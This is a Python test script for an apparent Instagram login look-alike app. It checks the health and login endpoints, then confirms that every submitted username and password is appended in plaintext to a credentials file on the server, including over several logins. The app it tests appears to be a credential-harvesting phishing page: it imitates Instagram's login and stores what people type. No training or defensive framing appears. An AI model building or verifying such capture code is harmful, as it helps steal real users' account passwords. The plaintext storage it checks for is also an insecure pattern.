import requests
import sys
import os
from datetime import datetime

class InstagramLoginAPITester:
    def __init__(self, base_url="https://08527ff4-ab7a-4db9-ad96-d45a06816d6b.preview.emergentagent.com"):
        self.base_url = base_url
        self.tests_run = 0
        self.tests_passed = 0

    def run_test(self, name, method, endpoint, expected_status, data=None):
        """Run a single API test"""
        url = f"{self.base_url}/{endpoint}"
        headers = {'Content-Type': 'application/json'}

        self.tests_run += 1
        print(f"\n🔍 Testing {name}...")
        print(f"URL: {url}")
        
        try:
            if method == 'GET':
                response = requests.get(url, headers=headers)
            elif method == 'POST':
                response = requests.post(url, json=data, headers=headers)

            success = response.status_code == expected_status
            if success:
                self.tests_passed += 1
                print(f"✅ Passed - Status: {response.status_code}")
                try:
                    response_data = response.json()
                    print(f"Response: {response_data}")
                    return True, response_data
                except:
                    print(f"Response: {response.text}")
                    return True, {}
            else:
                print(f"❌ Failed - Expected {expected_status}, got {response.status_code}")
                print(f"Response: {response.text}")

            return success, {}

        except Exception as e:
            print(f"❌ Failed - Error: {str(e)}")
            return False, {}

    def test_health_check(self):
        """Test health endpoint"""
        return self.run_test(
            "Health Check",
            "GET",
            "api/health",
            200
        )

    def test_root_endpoint(self):
        """Test root endpoint"""
        return self.run_test(
            "Root Endpoint",
            "GET",
            "",
            200
        )

    def test_login_endpoint(self, username, password):
        """Test login endpoint"""
        return self.run_test(
            "Login Endpoint",
            "POST",
            "api/login",
            200,
            data={"username": username, "password": password}
        )

    def check_credentials_file(self, username, password):
        """Check if credentials were saved to file"""
        print(f"\n🔍 Checking credentials file...")
        credentials_file = "/app/backend/credentials/login_data.txt"
        
        try:
            if os.path.exists(credentials_file):
                with open(credentials_file, "r") as f:
                    content = f.read()
                    print(f"File content:\n{content}")
                    
                    # Check if the latest entry contains our test credentials
                    lines = content.strip().split('\n')
                    if lines:
                        latest_entry = lines[-1]
                        if f"{username}:{password}" in latest_entry:
                            print(f"✅ Credentials found in file: {latest_entry}")
                            self.tests_passed += 1
                            return True
                        else:
                            print(f"❌ Credentials not found in latest entry: {latest_entry}")
                    else:
                        print("❌ File is empty")
            else:
                print(f"❌ Credentials file does not exist: {credentials_file}")
                
            self.tests_run += 1
            return False
            
        except Exception as e:
            print(f"❌ Error checking credentials file: {str(e)}")
            self.tests_run += 1
            return False

    def test_multiple_logins(self):
        """Test multiple login attempts to ensure appending works"""
        print(f"\n🔍 Testing multiple login attempts...")
        
        test_users = [
            ("user1", "pass1"),
            ("user2", "pass2"),
            ("testuser", "testpass123")
        ]
        
        for username, password in test_users:
            success, _ = self.test_login_endpoint(username, password)
            if not success:
                return False
                
        # Check if all entries are in the file
        return self.check_credentials_file("testuser", "testpass123")

def main():
    print("🚀 Starting Instagram Login API Tests...")
    
    # Setup
    tester = InstagramLoginAPITester()
    
    # Test 1: Health check
    tester.test_health_check()
    
    # Test 2: Root endpoint
    tester.test_root_endpoint()
    
    # Test 3: Login endpoint with test data
    test_username = "testuser"
    test_password = "testpass123"
    
    success, response = tester.test_login_endpoint(test_username, test_password)
    
    # Test 4: Check if credentials were saved to file
    if success:
        tester.check_credentials_file(test_username, test_password)
    
    # Test 5: Multiple login attempts
    tester.test_multiple_logins()
    
    # Test 6: Test error handling with invalid data
    print(f"\n🔍 Testing error handling...")
    try:
        response = requests.post(
            f"{tester.base_url}/api/login",
            json={"invalid": "data"},
            headers={'Content-Type': 'application/json'}
        )
        if response.status_code == 422:  # FastAPI validation error
            print("✅ Error handling works correctly for invalid data")
            tester.tests_passed += 1
        else:
            print(f"❌ Expected 422 for invalid data, got {response.status_code}")
        tester.tests_run += 1
    except Exception as e:
        print(f"❌ Error testing invalid data: {str(e)}")
        tester.tests_run += 1

    # Print final results
    print(f"\n📊 Backend API Test Results:")
    print(f"Tests passed: {tester.tests_passed}/{tester.tests_run}")
    
    if tester.tests_passed == tester.tests_run:
        print("🎉 All backend tests passed!")
        return 0
    else:
        print("⚠️ Some backend tests failed!")
        return 1

if __name__ == "__main__":
    sys.exit(main())